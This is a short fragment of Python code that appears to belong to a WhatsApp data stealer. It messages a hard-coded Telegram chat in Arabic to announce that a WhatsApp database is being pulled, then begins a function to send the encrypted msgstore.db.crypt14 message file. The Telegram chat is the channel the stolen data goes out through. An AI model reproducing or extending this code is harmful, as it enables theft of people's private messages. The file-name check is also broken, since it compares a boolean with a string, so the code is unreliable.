...
bot.send_message(chat_id=7477381053, text= 'جاري سحب قاعدة بيانات واتساب 🔥☠️')
bot.send_message(chat_id=7477381053, text= 'ملاحظة: لا يمكنك فك تشفير هذا الملف الا بأدوات متقدمة جدا وقد تكون مدفوعة 🚫')
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith("msgstore.db.crypt14") == 'msgstore.db.crypt14':
